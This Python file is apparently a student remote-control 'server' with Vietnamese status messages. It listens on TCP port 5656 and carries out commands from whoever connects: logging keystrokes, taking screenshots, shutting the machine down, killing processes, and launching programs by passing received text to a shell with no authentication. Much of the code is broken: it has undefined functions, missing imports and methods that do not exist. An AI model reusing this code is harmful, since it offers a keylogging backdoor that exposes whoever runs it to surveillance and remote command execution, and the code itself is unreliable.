import socket
import os
import sys
import winreg
import subprocess
import io

import tkinter as tk
from tkinter import messagebox
from threading import Thread
from Keylog import KeyLogger


class Program:
    server = None
    client = None
    ns = None
    nr = None
    nw = None

class Server(tk.Tk):
    def __init__(self):
        tk.Tk.__init__(self)

        self.title("Server")
        self.geometry("300x200")

        self.start_button = tk.Button(self, text="Start Server", command=self.start_server)
        self.start_button.pack(pady=20)

        self.stop_button = tk.Button(self, text="Stop Server", command=self.stop_server, state=tk.DISABLED)
        self.stop_button.pack(pady=10)

        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def start_server(self):
        Program.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Program.server.bind(('', 5656))
        Program.server.listen(100)
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        print("Server started, waiting for client...")
        print("IP Address:", ip_address)

        Program.client, addr = Program.server.accept()
        Program.ns = Program.client.makefile('rw')

        print("Client connected at: ", addr)

        Program.nr = Program.ns.make_reader()
        Program.nw = Program.ns.make_writer()

        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

        self.handle_data()

    def stop_server(self):
        Program.nr.close()
        Program.nw.close()
        Program.ns.close()
        Program.client.close()
        Program.server.close()

        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

    def receive_data(self):
        try:
            data = Program.nr.readline()
            return data
        except:
            return "QUIT"

    def handle_data(self, data):
        Program.ns = Program.client.makefile('rw')
        Program.nr = Program.ns.makefile('r')
        Program.nw = Program.ns.makefile('w')
        
        while True:
            data = self.receive_data()
            
            if data == "KEYLOG":
                keylog()
            elif data == "SHUTDOWN":
                shutdown()
            elif data == "REGISTRY":
                registry()
            elif data == "TAKEPIC":
                takepic()
            elif data == "PROCESS":
                process()
            elif data == "APPLICATION":
                application()
            elif data == "QUIT":
                break
        
        Program.client.shutdown(socket.SHUT_RDWR)
        Program.client.close()
        pass

    def on_closing(self):
        if messagebox.askokcancel("Quit", "Do you want to quit?"):
            self.stop_server()
            self.destroy()

def shutdown():
    os.system("shutdown -s")

def hook_key(tklog):
    tklog.resume()
    with open(appstart.path, "w") as file:
        file.write("")

def unhook(tklog):
    tklog.suspend()

def print_keys():
    s = ""
    with open(appstart.path, "r") as file:
        s = file.read()
    with open(appstart.path, "w") as file:
        file.write("")
    if s == "":
        s = "\0"
    Program.nw.write(s)
    Program.nw.flush()

def keylog():
    tklog = threading.Thread(target=KeyLogger.InterceptKeys.startKLog)
    s = ""
    tklog.start()
    tklog.suspend()
    while True:
        receive_signal(s)
        if s == "PRINT":
            print_keys()
        elif s == "HOOK":
            hook_key(tklog)
        elif s == "UNHOOK":
            unhook(tklog)
        elif s == "QUIT":
            return

def takepic():   
    with mss() as sct:
        img = sct.shot()

    nw.write(str(len(img)))
    Program.client.sendall(img)
    pass

def process():
    while True:
        data = receive_signal()

        if data == "LIST":
            for p in psutil.process_iter():
                nw.write(str(p.name()) + '\n')

        elif data == "KILL":
            pid = int(nr.readline())
            p = psutil.Process(pid)
            p.kill()
          
        elif data == "QUIT":
            break

        else:
            pass  

def application():
    ss = ""
    pr = []
    while True:
        receive_signal(ss)
        if ss == "XEM":
            u = ""
            s = ""
            pr = subprocess.Popen(['tasklist'], stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
            soprocess = len(pr.splitlines()) - 3
            u = str(soprocess)
            Program.nw.write(u)
            Program.nw.flush()
            for line in pr.splitlines()[3:]:
                p = line.split()[0].decode()
                if p:
                    u = "ok"
                Program.nw.write(u)
                Program.nw.flush()
                if u == "ok":
                    u = line.split()[0].decode()
                    Program.nw.write(u)
                    Program.nw.flush()
                    u = line.split()[1].decode()
                    Program.nw.write(u)
                    Program.nw.flush()
                    u = line.split()[2].decode()
                    Program.nw.write(u)
                    Program.nw.flush()

        elif ss == "KILL":
            test = True
            while test:
                receive_signal(ss)
                if ss == "KILLID":
                    u = Program.nr.readline()
                    test2 = False
                    if u != "":
                        for line in pr.splitlines()[3:]:
                            p = line.split()
                            if len(p) > 1:
                                pid = p[1].decode()
                                if pid == u:
                                    try:
                                        subprocess.Popen(['taskkill', '/F', '/PID', pid], stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
                                        Program.nw.write("Đã diệt chương trình")
                                        Program.nw.flush()
                                    except Exception as ex:
                                        Program.nw.write("Lỗi")
                                        Program.nw.flush()
                                    test2 = True
                        if not test2:
                            Program.nw.write("Không tìm thấy chương trình")
                            Program.nw.flush()
                elif ss == "QUIT":
                    test = False

        elif ss == "START":
            test = True
            while test:
                receive_signal(ss)
                if ss == "STARTID":
                    u = Program.nr.readline()
                    if u != "":
                        u += ".exe"
                        try:
                            subprocess.Popen(u, shell=True)
                            Program.nw.write("Chương trình đã được bật")
                            Program.nw.flush()
                        except Exception as ex:
                            Program.nw.write("Lỗi")
                            Program.nw.flush()
                        break
                    Program.nw.write("Lỗi")
                    Program.nw.flush()
                elif ss == "QUIT":
                    test = False

        elif ss == "QUIT":
            return

def start_server():
    app = Server();
    app.mainloop();

if __name__ == "__main__":
    start_server()